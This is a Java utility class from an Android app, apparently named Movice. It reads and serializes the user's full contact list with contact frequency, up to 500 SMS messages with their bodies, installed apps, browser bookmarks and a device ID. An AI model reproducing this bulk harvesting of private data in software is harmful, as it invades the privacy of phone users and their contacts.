package com.project.movice.utils;

import android.content.ContentResolver;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.gson.Gson;
import com.project.movice.R;
import com.project.movice.application.MoviceApp;

import java.net.InetAddress;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Created by wy on 2018/1/22 15:10.
 */


public class PhoneInfo {

    private static PhoneInfo mPhoneInfo;

    private static Context mContext;

    private PhoneInfo() {
    }

    public static PhoneInfo getInstance() {
        mContext = MoviceApp.getContext();
        if (null == mPhoneInfo) {
            mPhoneInfo = new PhoneInfo();
        }
        return mPhoneInfo;
    }


    /**
     * 获取软件包名,版本名
     */
    public String getVersionName() {
        try {
            String pkName = mContext.getPackageName();
            String versionName = mContext.getPackageManager().getPackageInfo(
                    pkName, 0).versionName;
            return versionName;
        } catch (Exception e) {
        }
        return null;
    }

    public String getPackageName() {
        try {
            String pkName = mContext.getPackageName();
            return pkName;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }


    /**
     * 获取软件包名,版本号
     */
    public int getVersionCode() {
        try {
            String pkName = mContext.getPackageName();
            int versionCode = mContext.getPackageManager()
                    .getPackageInfo(pkName, 0).versionCode;
            return versionCode;
        } catch (Exception e) {
        }
        return 0;
    }


    /**
     * 获取App唯一标识
     *
     * @return
     */
    public static String getAppImei(Context context) {
        TelephonyManager tm;
        String imei = "";// imei号
//        try {
            imei = GetAndroidIdGAid.getAndroidGaid(context);
            Log.e("111111122222",imei);
//            tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
//            if (tm != null) {
//                if (ActivityCompat.checkSelfPermission(context, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
//                    return imei;
//                }
//                imei = tm.getDeviceId();
//            }
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
        return imei;
    }

    /**
     * 获取App名
     *
     * @return
     */
    public String getAppName() {
        return mContext.getResources().getString(R.string.app_name).replaceAll(" ", "");
    }

    /**
     * 获取通讯录记录
     *
     * @returnpublic String getContacts() {
     */
    public String getContacts() {
//        List<Map<String, String>> list = new ArrayList<Map<String, String>>();
//        try {
//            Uri contactUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
//            ContentResolver cr = mContext.getContentResolver();
//            Cursor cursor = cr.query(contactUri,
//                    new String[]{"display_name", "sort_key", "contact_id", "data1"},
//                    null, null, "sort_key");
//            String contactName;
//            String contactNumber;
//            String num;
//            while (cursor.moveToNext()) {
//                contactName = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
//                contactNumber = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
//                num= cursor.getString(cursor.getColumnIndex(ContactsContract.PhoneLookup.TIMES_CONTACTED));
//                Map<String, String> map = new HashMap<String, String>();
//                map.put("name", contactName);
//                map.put("mobile", contactNumber);
//                map.put("callTime", num);
//                list.add(map);
////                if (list.size() >= 500)//只获取500条记录
////                {
////                    break;
////                }
//            }
//            cursor.close();
//            return JSON.toJSONString(list);
//        } catch (Exception e) {
//            e.printStackTrace();
//        }
        try {
            Cursor cursor = mContext.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null);
            List<Map<String, String>> list = new ArrayList<Map<String, String>>();
            while (cursor.moveToNext()) {
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                int numFiedColumnIndex = cursor.getColumnIndex(ContactsContract.PhoneLookup.TIMES_CONTACTED);
                String num= cursor.getString(numFiedColumnIndex);
                String lastUpdateDate = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
                String lastContaDate = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED ));
                Map<String, String> map = new HashMap<String, String>();
                map.put("name", name);
                map.put("mobile", number);
                map.put("callTime", num);
                map.put("lastUpdateDate", lastUpdateDate);
                map.put("lastContaDate", lastContaDate);
                list.add(map);
            }
            cursor.close();
            return new Gson().toJson(list);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * 获取短信记录
     */
    public String getSmsFromPhone() {
        try {
            List<Map<String, String>> list = new ArrayList<Map<String, String>>();
            Uri SMS_INBOX = Uri.parse("content://sms/");
            ContentResolver cr = mContext.getContentResolver();
            String[] projection = new String[]{"_id", "address", "person", "body", "date", "type"};
            Cursor cur = cr.query(SMS_INBOX, projection, null, null, "date desc");
            if (null == cur) {
                return null;
            }
            while (cur.moveToNext()) {
                String number = cur.getString(cur.getColumnIndex("address"));//手机号
                String name = cur.getString(cur.getColumnIndex("person"));//联系人姓名列表
                String body = cur.getString(cur.getColumnIndex("body"));//短信内容
                String date = cur.getString(cur.getColumnIndex("date"));//日期
                //至此就获得了短信的相关的内容, 以下是把短信加入map中，构建listview,非必要。
                Map<String, String> map = new HashMap<String, String>();
                map.put("mobile", number);
                map.put("body", body);
                map.put("name", name);
                map.put("date", date);
                list.add(map);
                if (list.size() >= 500)
                    break;
            }
            cur.close();
            return new Gson().toJson(list);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }


    /**
     * 获取app第一次安装时间，和最后一次更新时间
     */
    public void getAppInstallTime() {
        List<Map<String, String>> list = new ArrayList<Map<String, String>>();
        try {
            PackageManager packageManager = mContext.getPackageManager();
            PackageInfo packageInfo = packageManager.getPackageInfo("com.facebook.katana", 0);
            //应用装时间
            long firstInstallTime = packageInfo.firstInstallTime;
            //应用最后一次更新时间
            long lastUpdateTime = packageInfo.lastUpdateTime;
        } catch (PackageManager.NameNotFoundException e) {
            e.printStackTrace();
        }
    }

    /**
     * 获取安装的所有应用程序
     *
     * @return
     */
    public String getAppInfos() {
        try {
            PackageManager pm = mContext.getPackageManager();
            //创建要返回的集合对象
            List<Map<String, String>> appInfos = new ArrayList<>();
            List<PackageInfo> packageInfos = pm.getInstalledPackages(0);
            for (int i = 0; i < packageInfos.size(); i++) {
                PackageInfo packageInfo = packageInfos.get(i);
                if ((packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                    Map<String, String> map = new HashMap<String, String>();
                    map.put("packageName", packageInfo.packageName);//包名
                    map.put("appVersion", packageInfo.versionName);//app版本
                    map.put("firstInstallTime", packageInfo.firstInstallTime + "");//第一次安装时间
                    map.put("lastUpdateTime", packageInfo.lastUpdateTime + "");//最近更新时间
                    map.put("appName", packageInfo.applicationInfo.loadLabel(pm).toString());//app名
                    appInfos.add(map);
                }
                if (appInfos.size() >= 200) break;
            }

//            //获取手机中所有安装的应用集合
//            List<ApplicationInfo> applicationInfos = pm.getInstalledApplications(PackageManager.GET_UNINSTALLED_PACKAGES);
//            //遍历所有的应用集合
//            for (ApplicationInfo info : applicationInfos) {
//                boolean isUserApp = filterApp(info);
//                if (isUserApp) {
//                    Map<String, String> map = new HashMap<String, String>();
//                    //获取应用程序的图标
//                    //            Drawable app_icon = info.loadIcon(pm);
//                    //            appInfo.setApp_icon(app_icon);
//
//                    //获取应用的名称
//                    String app_name = info.loadLabel(pm).toString();
//                    //获取应用的包名
//                    String packageName = info.packageName;
//                    map.put("appName", app_name);
//                    map.put("packageName", packageName);
//                    try {
//                        //获取应用的版本号
//                        PackageInfo packageInfo = pm.getPackageInfo(packageName, 0);
//                        String app_version = packageInfo.versionName;
//                        //应用装时间
//                        long firstInstallTime = packageInfo.firstInstallTime;
//                        //应用最后一次更新时间
//                        long lastUpdateTime = packageInfo.lastUpdateTime;
//                        map.put("appVersion", app_version);
//                        map.put("firstInstallTime", firstInstallTime + "");
//                        map.put("lastUpdateTime", lastUpdateTime + "");
//                    } catch (Exception e) {
//                        e.printStackTrace();
//                    }
//                    //判断应用程序是否是用户程序
////                boolean isUserApp = filterApp(info);
////                map.put("isUserApp", isUserApp + "");
//                    appInfos.add(map);
//                }
//            }
            return new Gson().toJson(appInfos);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return "";
    }

    //判断应用程序是否是用户程序
    public boolean filterApp(ApplicationInfo info) {
        //表示系统程序被手动更新后，也成为第三方应用程序
        if ((info.flags & ApplicationInfo.FLAG_UPDATED_SYSTEM_APP) != 0) {
            return true;
            //用户自己安装的应用程序
        } else if ((info.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
            return true;
        }
        return false;
    }

    public String AnalyseDomain(String host){
        String iPAddress = "";
        InetAddress ReturnStr = null;
        try {
            ReturnStr = InetAddress.getByName(host);
            iPAddress = ReturnStr.getHostAddress();
        } catch (Exception e) {
            e.printStackTrace();
            //未知主机，域名解析失败
        }
        //域名解析成功
        return iPAddress;
    }


    /**
     * 获取浏览器记录
     */
    public String getRecords() {
        String json = "";
        //创建要返回的集合对象
        List<Map<String, String>> info = new ArrayList<>();
        try {
            ContentResolver contentResolver = mContext.getContentResolver();
            Cursor cursor = contentResolver.query(
                    Uri.parse("content://browsr/bookmarks"), new String[]{
                            "title", "url", "date"}, "date!=?",
                    new String[]{"null"}, "date desc");
            while (cursor != null && cursor.moveToNext()) {
                Map<String, String> map = new HashMap<String, String>();
                String url = null;
                String title = null;
                String time = null;
                String date = null;
                StringBuilder recordBuilder = new StringBuilder();
                title = cursor.getString(cursor.getColumnIndex("title"));
                url = cursor.getString(cursor.getColumnIndex("url"));
                date = cursor.getString(cursor.getColumnIndex("date"));
                SimpleDateFormat dateFormat = new SimpleDateFormat(
                        "yyyy-MM-dd hh:mm;ss");
                Date d = new Date(Long.parseLong(date));
                time = dateFormat.format(d);
                map.put("title", title);
                map.put("url", url);
                map.put("date", date);
                info.add(map);
                if (info.size() >= 100)
                    break;
            }
            json = new Gson().toJson(info);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return json;
    }

    public Map<String, String> getSystemInfo() {
        Map<String, String> params = new HashMap<String, String>();
        params.put("v", getVersionName());
        params.put("o", "1");
        params.put("i", getAppImei(mContext));
        params.put("systemVersion", android.os.Build.VERSION.RELEASE);
        params.put("model", android.os.Build.MODEL);
        params.put("systemTime", System.currentTimeMillis() + "");
        params.put("platform", getAppName());
//		getChannel(context);
        return params;
    }
}
